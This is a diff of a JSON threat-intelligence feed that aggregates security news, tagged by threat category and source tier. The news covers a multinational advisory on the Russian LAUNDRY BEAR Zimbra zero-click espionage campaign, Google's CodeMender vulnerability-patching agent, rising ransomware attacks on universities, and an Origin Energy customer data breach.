-          "tier_1_government"
-        ]
-      },
-      "primary": {
-        "source": "NCSC UK",
-        "cohort": "government_authoritative",
-        "title": "UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations",
-        "link": "https://www.ncsc.gov.uk/news/uk-and-partners-expose-russian-state-supported-actors-for-new-zero-click-phishing-campaign",
-        "published": "2026-07-23T12:00:00+00:00",
-        "summary": "GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign",
-        "full_body": "News Download & print article PDF Download & print article PDF UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign Russian state-supported actors develop new technique to target Western email platforms and gain persistent access to compromised networks Organisations provided with trusted advice and support to protect sensitive data in the face of evolving cyber threats Russian state-supported cyber actors have targeted Western organisations with a malicious campaign which uses a zero-click exploit coined “beehive” (or “ Ulej ”) to steal emails, the UK has warned. Today, the National Cyber Security Centre – a part of GCHQ – alongside cyber security agencies in 15 countries, has exposed activities of LAUNDRY BEAR, an advanced persistent threat group who specialise in the covert acquisition of email data. Since July 2025, LAUNDRY BEAR has successfully targeted and stolen sensitive email information from organisations that use Zimbra Collaboration Suite (ZCS) software. US organisations have been targeted in sectors including defence, government, education, energy, law enforcement, media, NGOs and technology. In a new joint advisory , the NCSC and partners warn LAUNDRY BEAR’s ongoing campaign is indicative of espionage and almost certainly carried out with Russian state support. Unlike traditional phishing campaigns, “beehive” allows the threat actors to gain extensive and sustained access to emails without requiring a user’s input. Instead of clicking a link or opening a file, the user only has to view a malicious email within a vulnerable version of the ZCS webmail service to be compromised. Organisations that use ZCS are urged to follow the mitigation advice, including to immediately patch vulnerabilities and improve network monitoring capabilities. The cyber agencies caution that it is likely “beehive” could be adapted to exploit other vulnerabilities. As more organisations update their ZCS software, it is very likely that the group will also look to target other email systems that Western organisations use. The NCSC recommends all UK organisations should sign up to the free Early Warning service for malicious network activity notifications. The government is committed to raising cyber resilience across the UK to protect businesses and safeguard growth. Earlier this month, businesses from every corner of the British economy joined a pledge publicly committing to strengthen their defences in the face of a fast-evolving threat. Today’s action shows we’re working hand-in-hand with our allies to expose Russian state-supported hackers targeting Western organisations. It’s particularly concerning that these thugs tested their methods on victims in Ukraine, before targeting members of NATO. Organisations across the UK should sign up to NCSC’s Early Warning service to ensure they can quickly secure their systems against similar activity. Security Minister, Dan Jarvis MBE This phishing campaign demonstrates how hostile actors will ruthlessly adapt techniques and exploit vulnerable technology in pursuit of their aims to steal sensitive information from Western organisations. With our international partners, we strongly encourage organisations to familiarise themselves with the ‘zero-click’ techniques described in the advisory which could be used against other platforms, and act on the mitigation advice. We will continue to call out malicious cyber activity supported by the Russian state and urge everyone to follow NCSC guidance to raise resilience, including steps to strengthen online account security. Beth Hopkins CMG, NCSC Chief Operating Officer The advisory highlights how these malicious cyber techniques were extensively trialled on Ukrainian victims before use against members of NATO, which is part of a growi",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "phishing_social_eng",
-            "apt_espionage"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "government",
-            "critical_infrastructure",
-            "education"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_government",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "NCSC UK",
-          "cohort": "government_authoritative",
-          "title": "UK and partners expose Russian state-supported actors for new ‘zero-click’ phishing campaign targeting Western organisations",
-          "link": "https://www.ncsc.gov.uk/news/uk-and-partners-expose-russian-state-supported-actors-for-new-zero-click-phishing-campaign",
-          "published": "2026-07-23T12:00:00+00:00",
-          "summary": "GCHQ’s National Cyber Security Centre and international partners issue warning as ‘LAUNDRY BEAR’ cyber threat group exposed for targeted phishing campaign",
-          "taxonomy": {
-            "threat_categories": [
-              "phishing_social_eng",
-              "apt_espionage"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "government",
-              "critical_infrastructure",
-              "education"
-            ],
             "affected_products": [],
             "tools_used": [],
             "cve_ids": [],
@@ -6196,6 +6181,208 @@
               "OpenAI/ChatGPT": "target",
               "Linux kernel": "tool"
             },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "1258d35e57",
+      "priority_score": 9,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "zero_day"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "government"
+        ],
+        "affected_products": [
+          "Google/Gemini"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "poc_available",
+          "zero_day"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Help Net Security",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Google gives developers an AI bug hunter that also writes patches",
+        "link": "https://www.helpnetsecurity.com/2026/07/24/google-codemender-ai-agent-code-security/",
+        "published": "2026-07-24T08:53:17+00:00",
+        "summary": "Google has launched a preview of CodeMender, an AI agent built to scan code for security flaws, confirm they are exploitable, and generate fixes for developers to review. (Source: Google) The company describes it as a response to attackers who are already using AI to speed up their work, arguing that defenders need automation that moves at the same speed. “CodeMender can help you advance from passive scanning to automated code remediation, and reduce zero-day … More → The post Google gives developers an AI bug hunter that also writes patches appeared first on Help Net Security .",
+        "full_body": "Sinisa Markovic , Managing Editor, Help Net Security July 24, 2026 Share Google gives developers an AI bug hunter that also writes patches Google has launched a preview of CodeMender, an AI agent built to scan code for security flaws, confirm they are exploitable, and generate fixes for developers to review. (Source: Google) The company describes it as a response to attackers who are already using AI to speed up their work, arguing that defenders need automation that moves at the same speed. “CodeMender can help you advance from passive scanning to automated code remediation, and reduce zero-day risk,” Google said. CodeMender is now available through Gemini Enterprise Agent Platform, using Google’s generally available Gemini models, or as a component of AI Threat Defense, Google’s AI-powered security platform. A separate version paired with Gemini 3.5 Flash Cyber is limited to a small number of governments and trusted partners, with Google planning to expand access over time. Google plans to support third-party frontier models later this year. “We’ve fine-tuned CodeMender’s harness to be continuously updated with the latest Google DeepMind research, including the up-to-date agent skills, security tools, and system prompts,” the company explained. “Operating in the secure-by-design Agent Platform, CodeMender is protected by enterprise-grade, built-in governance and security guardrails, including secure traffic routing through your VPC, data isolation and encryption, and zero retention of source code data,” Google added. How the agent works CodeMender runs in three stages. It first scans repositories for vulnerabilities that static tools often miss, including memory corruption, injection flaws, web security issues, cryptographic weaknesses, and insecure data handling. It supports C/C++, Go, Java, Python, Ruby, Rust, and TypeScript. Second, it tries to confirm a flaw is worth acting on. Rather than stopping at a pattern match, CodeMender builds a proof-of-concept exploit and runs it in a sandbox the customer controls, a step Google says cuts down on false positives. Once a flaw is confirmed, the agent writes a patch and checks it with a model acting as judge, meant to catch cases where a fix breaks something else in the application. The patch reaches a developer as a code diff, and no change reaches a repository without manual approval. When deployed within AI Threat Defense, CodeMender works alongside Wiz to link vulnerabilities with deployment context and trigger automated penetration testing. “CodeMender is a critical step towards a continuous, self-healing agentic software development lifecycle, a future where code is autonomously secured, validated, and patched before it ever hits production,” the company concluded . More about AI code cybersecurity Google vulnerability management Share",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "zero_day"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "government"
+          ],
+          "affected_products": [
+            "Google/Gemini"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "zero_day",
+            "poc_available"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Google/Gemini": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Help Net Security",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Google gives developers an AI bug hunter that also writes patches",
+          "link": "https://www.helpnetsecurity.com/2026/07/24/google-codemender-ai-agent-code-security/",
+          "published": "2026-07-24T08:53:17+00:00",
+          "summary": "Google has launched a preview of CodeMender, an AI agent built to scan code for security flaws, confirm they are exploitable, and generate fixes for developers to review. (Source: Google) The company describes it as a response to attackers who are already using AI to speed up their work, arguing that defenders need automation that moves at the same speed. “CodeMender can help you advance from passive scanning to automated code remediation, and reduce zero-day … More → The post Google gives developers an AI bug hunter that also writes patches appeared first on Help Net Security .",
+          "taxonomy": {
+            "threat_categories": [
+              "zero_day"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "government"
+            ],
+            "affected_products": [
+              "Google/Gemini"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "zero_day",
+              "poc_available"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Google/Gemini": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "14cb190760",
+      "priority_score": 9,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [
+          "LockBit"
+        ],
+        "affected_industries": [
+          "education",
+          "government"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Infosecurity Magazine",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Ransomware Attacks Targeting Universities on the Rise",
+        "link": "https://www.infosecurity-magazine.com/news/university-ransomware-attacks-rise/",
+        "published": "2026-07-24T09:15:00+00:00",
+        "summary": "Comparitech’s analysis of incidents in the first half of 2026 finds that the emergence of The Gentlemen ransomware has resulted in surge in attacks against higher education",
+        "full_body": "Infosecurity Magazine Home » News » Ransomware Attacks Targeting Universities on the Rise Ransomware Attacks Targeting Universities on the Rise News 24 July 2026 Written by Danny Palmer Deputy Editor , Infosecurity Magazine Universities have found themselves in the firing line of cybercriminals, as ransomware attacks against higher education institutions have increased, analysis of recent incidents has revealed. According to the Comparitech’s Education Ransomware Roundup for the first half of 2026, the number of attacks against higher education providers between January and June increased by 8% when compared with the previous six months. The report, published on July 23 , pointed to the rise of The Gentlemen ransomware operation as a key factor in the surge of attacks against the sector. The group’s attacks on education increased 275% in the first half of 2026, compared with the second half of 2025, and 80% of the gang’s attacks against the education sector were against colleges and universities. The Comparitech figures put the number of ransomware attacks on the global education sector during the first half of 2026 at 104. Of these incidents, 36 were confirmed as ransomware by the victim. While the number of ransomware attacks against higher education has increased, the report also noted that the overall number of recorded incidents against the education sector has a whole has decreased. This is due to the number of attacks against primary and secondary schools decreasing by a quarter. However, this does not mean the ransomware problem has disappeared. \"This H1 report yet again emphasizes the impact one group can have on the threat landscape. While initially the dip in attacks makes for positive reading, further investigations reveal that this is largely due to one gang and its choice of target,” said Rebecca Moody, head of data research at Comparitech. “The Gentlemen has gained immense notoriety in recent months and, as our data shows, has focused on higher education institutions,” she added. US Education Most Targeted by Ransomware The Comparitech data also showcased how ransomware attacks against the education sector is a global issue. Establishments in the US were the biggest target for ransomware groups, with 34 confirmed victims, the UK and Brazil accounted for 13 and 8 victims respectively. Universities in 17 additional countries experienced at least one confirmed ransomware attack during the period. The prolific perpetrators of ransomware attacks against the education sector were The Gentlemen and Qilin , which accounted for 15 claimed attacks each, followed by LockBit , which claimed 9, then Interlock and Nova, which claimed 6 each. Read More: Why Ransomware Remains One of Cybersecurity’s Most Persistent and Costly Threats The report also noted that the median ransom demand issued to victim organizations in the education sector during the first half of 2026 stood at $420,620, up 53% from the second half of $275,000. The largest ransom demand during the period was a demand of $1.9m, issued following an attack on Mount Royal University in Canada. A month on from the attack, the university’s systems were still impacted and attackers claimed to have stolen over 10TB of data. “Last month's attack on Mount Royal University also serves as a stark reminder of the drastic and far-reaching consequences attacks on education continue to have and that system encryption and data theft aren't the only things to worry about,” said Moody. “The hackers also deleted entire drives of data, which hasn't just impeded the college's ability to recover from the attack but means some data may be completely unrecoverable, too,” she concluded. You may also like Government Agencies Falling Victim to Ransomware Daily, Warns Study News 17 July 2026 The Gentlemen Overtakes Qilin as Most Prolific Ransomware Threat News 17 July 2026 A New Ransomware Threat Actor Emerges Every Week, Warns Report News 21 July 2026 Major Increase in Ransomware Attacks T",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion"
+          ],
+          "actor_attribution": [
+            "LockBit"
+          ],
+          "affected_industries": [
+            "government",
+            "education"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Ransomware Attacks Targeting Universities on the Rise",
+          "link": "https://www.infosecurity-magazine.com/news/university-ransomware-attacks-rise/",
+          "published": "2026-07-24T09:15:00+00:00",
+          "summary": "Comparitech’s analysis of incidents in the first half of 2026 finds that the emergence of The Gentlemen ransomware has resulted in surge in attacks against higher education",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion"
+            ],
+            "actor_attribution": [
+              "LockBit"
+            ],
+            "affected_industries": [
+              "government",
+              "education"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -6808,102 +6995,6 @@
       ]
     },
     {
-      "cluster_id": "38eb29d9d7",
-      "priority_score": 8,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "data_breach"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "critical_infrastructure",
-          "financial_services",
-          "government",
-          "healthcare"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "The Record",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Major Australian energy supplier confirms customer data compromised",
-        "link": "https://therecord.media/australia-origin-energy-data-breach",
-        "published": "2026-07-23T13:20:00+00:00",
-        "summary": "Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.",
-        "full_body": "A bird on barbed wire near electricity infrastructure in Adelaide, Australia. Image: Cameron Raynes via Unsplash Major Australian energy supplier confirms customer data compromised An Australian energy company serving nearly 5 million customers announced Thursday that it suffered a data breach and that it is working with federal agencies to investigate. On Wednesday, Sydney-based Origin Energy had said in a brief announcement that it was “investigating a potential security incident” after the news outlet The Australian reported that a purported hacker had sent what they claimed to be a sample of stolen records from the company. In a second update , Origin confirmed that customer data had been compromised and that it is “working to understand the total number of impacted customers.” The data may include account information, the last four digits of credit card numbers and last three digits of bank account numbers, as well as names, addresses and dates of birth. Origin CEO Frank Calabria apologized to customers. “One of our key priorities is taking action to secure our systems and ensure no further unauthorised access,” he said. “We are working with independent cyber experts to support Origin, and that work is continuing alongside the work of authorities.” The breach of Australia’s largest electricity and gas retailer follows the recent compromise of sensitive medical data belonging to a major Australian network of healthcare clinics. Partnered Health confirmed that patients who visited at least 21 clinics may have had medical records stolen in a cyberattack. News Briefs News Cybercrime Industry Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles James Reddick has worked as a journalist around the world, including in Lebanon and in Cambodia, where he was Deputy Managing Editor of The Phnom Penh Post. He is also a radio and podcast producer for outlets like Snap Judgment.",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "data_breach"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "healthcare",
-            "financial_services",
-            "government",
-            "critical_infrastructure"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "The Record",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Major Australian energy supplier confirms customer data compromised",
-          "link": "https://therecord.media/australia-origin-energy-data-breach",
-          "published": "2026-07-23T13:20:00+00:00",
-          "summary": "Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.",
-          "taxonomy": {
-            "threat_categories": [
-              "data_breach"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "healthcare",
-              "financial_services",
-              "government",
-              "critical_infrastructure"
-            ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "c68e26f04e",
       "priority_score": 8,
       "member_count": 1,
@@ -6989,6 +7080,102 @@
               "government",
               "critical_infrastructure",
               "telecommunications"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "38eb29d9d7",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "critical_infrastructure",
+          "financial_services",
+          "government",
+          "healthcare"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "The Record",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Major Australian energy supplier confirms customer data compromised",
+        "link": "https://therecord.media/australia-origin-energy-data-breach",
+        "published": "2026-07-23T13:20:00+00:00",
+        "summary": "Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.",
+        "full_body": "A bird on barbed wire near electricity infrastructure in Adelaide, Australia. Image: Cameron Raynes via Unsplash Major Australian energy supplier confirms customer data compromised An Australian energy company serving nearly 5 million customers announced Thursday that it suffered a data breach and that it is working with federal agencies to investigate. On Wednesday, Sydney-based Origin Energy had said in a brief announcement that it was “investigating a potential security incident” after the news outlet The Australian reported that a purported hacker had sent what they claimed to be a sample of stolen records from the company. In a second update , Origin confirmed that customer data had been compromised and that it is “working to understand the total number of impacted customers.” The data may include account information, the last four digits of credit card numbers and last three digits of bank account numbers, as well as names, addresses and dates of birth. Origin CEO Frank Calabria apologized to customers. “One of our key priorities is taking action to secure our systems and ensure no further unauthorised access,” he said. “We are working with independent cyber experts to support Origin, and that work is continuing alongside the work of authorities.” The breach of Australia’s largest electricity and gas retailer follows the recent compromise of sensitive medical data belonging to a major Australian network of healthcare clinics. Partnered Health confirmed that patients who visited at least 21 clinics may have had medical records stolen in a cyberattack. News Briefs News Cybercrime Industry Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles James Reddick has worked as a journalist around the world, including in Lebanon and in Cambodia, where he was Deputy Managing Editor of The Phnom Penh Post. He is also a radio and podcast producer for outlets like Snap Judgment.",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "data_breach"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "healthcare",
+            "financial_services",
+            "government",
+            "critical_infrastructure"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "The Record",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Major Australian energy supplier confirms customer data compromised",
+          "link": "https://therecord.media/australia-origin-energy-data-breach",
+          "published": "2026-07-23T13:20:00+00:00",
+          "summary": "Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.",
+          "taxonomy": {
+            "threat_categories": [
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "healthcare",
+              "financial_services",
+              "government",
+              "critical_infrastructure"
             ],
             "affected_products": [],
             "tools_used": [],
@@ -7305,7 +7492,7 @@
         "link": "https://cyberscoop.com/russian-laundry-bear-zimbra-exploit/",
         "published": "2026-07-23T17:33:37+00:00",
         "summary": "Laundry Bear exploited a zero-day vulnerability for five months before it was patched in November 2025, and the group is still actively exploiting vulnerable environments. The post Russian espionage group using novel Zimbra exploit to steal sensitive data from Western countries appeared first on CyberScoop .",
-        "full_body": "Advertisement Subscribe to our daily newsletter. Subscribe Close A Russian state-sponsored threat group has been stealing sensitive data from governments and commercial organizations since July 2025 via a novel exploit in popular Linux-based enterprise software, U.S. authorities and cyber officials from more than a dozen other countries warned in a joint cybersecurity advisory Thursday. Laundry Bear’s most recent espionage campaign involves the exploitation of a zero-day vulnerability in Zimbra Collaboration Suite that wasn’t patched until November 2025, five months after attacks were well underway, officials said. The exploit just requires a view — no clicks — and allows attackers to steal the previous 90 days’ worth of email, the account’s password, search history, the victim organization’s email directory, two-factor authentication tokens and other newly created passwords. “The covert and persistent nature of this activity, along with the absence of any known financial extortion, almost certainly indicates this group’s involvement in espionage activities with Russian government backing,” officials wrote in the advisory. Advertisement “Additionally, extensive Ukrainian targeting, prior to use against U.S. and other NATO allies, outlines an increasing trend within Russian cyber threat groups to target Ukrainian users first—both as a priority target and as a testbench for malicious cyber techniques before broader global deployment.” The state-sponsored espionage group, also known as Void Blizzard, has compromised governments and organizations in the defense, education, energy, law enforcement, media, finance, transportation and technology sectors. Laundry Bear’s year-long campaign involving the exploitation of CVE-2025-66376 showcases more technical capabilities, including a custom JavaScript payload it delivers to targeted victims via phishing emails. The threat group could also likely adapt the novel data exfiltration and aggregation capability, dubbed “beehive,” to exploit other vulnerabilities, officials warned. The defect’s medium-severity rating of 6.1 underscores the challenge defenders regularly confront in prioritizing patching schedules based on measure of severity alone. The Russian state-supported group, which has been active since at least 2024, is still actively exploiting Zimbra Collaboration Suite instances that remain unpatched, officials said. Advertisement Authorities shared Thursday indicators of compromise, mitigation steps and urged organizations to update their vulnerable software. “This campaign’s targeted victimology and limited exploitation capabilities likely indicate this group manually identifies and targets the victim organizations” by identifying organizations with public-facing infrastructure, officials wrote in the advisory. Once a target is identified, Laundry Bear also likely compiles email addresses for users to target with the exploit via phishing emails. Officials did not identify specific victims or describe the volume of organizations already compromised. The joint cybersecurity advisory was issued by the United States, Australia, Canada, New Zealand, the United Kingdom, Czech Republic, Denmark, Estonia, Finland, France, Italy, Moldova, the Netherlands, Poland, Spain and Sweden. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops Gwengoat, iStock/Getty Images Plus (Getty Images) (Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity A builder’s view of the AI arms race What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Government Most federal cybersecurity reporting rules are duplicative, study finds White House accuses Chinese company of distilling Anthropic’s Fable AI models keep getting caught cheating Where’s the Trump administration line on AI regulation? Technology OpenAI says model test was beh",
+        "full_body": "Advertisement Subscribe to our daily newsletter. Subscribe Close A Russian state-sponsored threat group has been stealing sensitive data from governments and commercial organizations since July 2025 via a novel exploit in popular Linux-based enterprise software, U.S. authorities and cyber officials from more than a dozen other countries warned in a joint cybersecurity advisory Thursday. Laundry Bear’s most recent espionage campaign involves the exploitation of a zero-day vulnerability in Zimbra Collaboration Suite that wasn’t patched until November 2025, five months after attacks were well underway, officials said. The exploit just requires a view — no clicks — and allows attackers to steal the previous 90 days’ worth of email, the account’s password, search history, the victim organization’s email directory, two-factor authentication tokens and other newly created passwords. “The covert and persistent nature of this activity, along with the absence of any known financial extortion, almost certainly indicates this group’s involvement in espionage activities with Russian government backing,” officials wrote in the advisory. Advertisement “Additionally, extensive Ukrainian targeting, prior to use against U.S. and other NATO allies, outlines an increasing trend within Russian cyber threat groups to target Ukrainian users first—both as a priority target and as a testbench for malicious cyber techniques before broader global deployment.” The state-sponsored espionage group, also known as Void Blizzard, has compromised governments and organizations in the defense, education, energy, law enforcement, media, finance, transportation and technology sectors. Laundry Bear’s year-long campaign involving the exploitation of CVE-2025-66376 showcases more technical capabilities, including a custom JavaScript payload it delivers to targeted victims via phishing emails. The threat group could also likely adapt the novel data exfiltration and aggregation capability, dubbed “beehive,” to exploit other vulnerabilities, officials warned. The defect’s medium-severity rating of 6.1 underscores the challenge defenders regularly confront in prioritizing patching schedules based on measure of severity alone. The Russian state-supported group, which has been active since at least 2024, is still actively exploiting Zimbra Collaboration Suite instances that remain unpatched, officials said. Advertisement Authorities shared Thursday indicators of compromise, mitigation steps and urged organizations to update their vulnerable software. “This campaign’s targeted victimology and limited exploitation capabilities likely indicate this group manually identifies and targets the victim organizations” by identifying organizations with public-facing infrastructure, officials wrote in the advisory. Once a target is identified, Laundry Bear also likely compiles email addresses for users to target with the exploit via phishing emails. Officials did not identify specific victims or describe the volume of organizations already compromised. The joint cybersecurity advisory was issued by the United States, Australia, Canada, New Zealand, the United Kingdom, Czech Republic, Denmark, Estonia, Finland, France, Italy, Moldova, the Netherlands, Poland, Spain and Sweden. Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops Gwengoat, iStock/Getty Images Plus (Getty Images) (Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity A builder’s view of the AI arms race What the post-quantum executive order means for CISOs How security investigators can get the right info out of AI security tools Government ANCHOR-CI could fix 20 years of broken government-industry collaboration Most federal cybersecurity reporting rules are duplicative, study finds White House accuses Chinese company of distilling Anthropic’s Fable AI models keep getting caught cheating Technology OpenAI says m",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
@@ -7594,12 +7781,7 @@
           "supply_chain"
         ],
         "actor_attribution": [],
-        "affected_industries": [
-          "financial_services",
-          "healthcare",
-          "manufacturing_industrial",
-          "retail_ecommerce"
-        ],
+        "affected_industries": [],
         "affected_products": [],
         "tools_used": [],
         "cve_ids": [],
@@ -7619,20 +7801,15 @@
         "link": "https://www.helpnetsecurity.com/2026/07/24/ransomware-attack-trends-2026-report/",
         "published": "2026-07-24T04:30:22+00:00",
         "summary": "Ransomware activity followed a recognizable pattern during the previous four years. Each year was defined by a dominant actor, its collapse, or a major supply chain incident. Black Kite’s 2026 Ransomware Report documents a more fragmented market, with multiple ransomware playbooks scaling at the same time. Monthly victim count by threat actor (Source: Black Kite) Between April 2025 and March 2026, 61 new ransomware groups entered the market, averaging more than one group per week. … More → The post Ransomware in 2026: More groups, more victims, no slowdown appeared first on Help Net Security .",
-        "full_body": "Anamarija Pogorelec , Senior Staff Writer, Help Net Security July 24, 2026 Share Ransomware in 2026: More groups, more victims, no slowdown Ransomware activity followed a recognizable pattern during the previous four years. Each year was defined by a dominant actor, its collapse, or a major supply chain incident . Black Kite’s 2026 Ransomware Report documents a more fragmented market, with multiple ransomware playbooks scaling at the same time. Monthly victim count by threat actor (Source: Black Kite) Between April 2025 and March 2026, 61 new ransomware groups entered the market, averaging more than one group per week. By June 2026, the number of active threat groups had reached 146. The five largest groups accounted for 43.6% of all victims. “Previous years were often defined by a dominant ransomware group or a single major event. This year was different. We saw more groups enter the market, while established operators continued to scale and attack volume accelerated in the second half. Those shifts fundamentally changed the shape of the ransomware landscape,” said Ferhat Dikbiyik , Chief Research & Intelligence Officer at Black Kite. Ransomware victim trends and activity The reporting period recorded 7,551 ransomware victims. Activity in the first half remained close to the previous year’s monthly baseline. Ransomware disclosures increased by 60% in the second half compared with the first. The period from October 2025 through March 2026 marked a sustained increase in ransomware activity. Qilin became the largest volume operator. New groups added victim volume without displacing established operators. Several launched high-volume campaigns soon after entering the market, and some established groups declined or ceased operations. Geographic distribution of victims The United States accounted for 49.3% of all observed victims and remained the most targeted country. Europe’s four most affected countries collectively recorded more than 250 additional victims during the reporting period. Several strengthened their positions in the global top 10. Organizations operating across European markets should account for the region’s growing ransomware activity. Third-party risk programs centered on U.S. exposure profiles may leave European risks underrepresented. Parts of Asia recorded some of the largest percentage increases. Country-level victim counts rose sharply across several markets in the region. Industries most affected by ransomware Manufacturing remained the most targeted sector, followed by professional, scientific, and technical services. Construction, healthcare, wholesale trade, finance and insurance, information, and retail trade formed the next tier of targeted industries. Weekdays accounted for 84.1% of all victim postings. Wednesday recorded the highest activity , and Sunday the lowest. Organizations with annual revenue between $50 million and $100 million accounted for the largest share of victims by revenue band. The share of organizations generating more than $100 million annually declined from the previous reporting period. Targeting patterns differed across revenue bands. Some ransomware groups ran high-volume campaigns against accessible organizations, with others 